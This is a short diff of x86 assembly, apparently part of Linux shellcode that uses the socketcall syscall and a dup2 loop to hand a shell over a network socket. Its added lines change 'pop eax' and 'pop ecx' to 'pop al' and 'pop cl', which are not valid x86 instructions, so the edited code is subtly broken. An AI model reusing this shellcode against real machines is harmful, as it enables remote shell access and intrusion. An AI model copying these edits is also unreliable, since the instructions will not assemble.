@@ -30,7 +30,7 @@ _start:
 	
 	; syscall 102 in eax
 	push byte 0x66
- 	pop eax
+ 	pop al
  	
 	; 1 in ebx for type of socketcall
 	xor ebx, ebx
@@ -140,7 +140,7 @@ _start:
 	
 	; Set 2 in ecx
 	push byte 0x2
-	pop ecx
+	pop cl
 	
 	; Dup2 loop instructions
 	dup_loop:
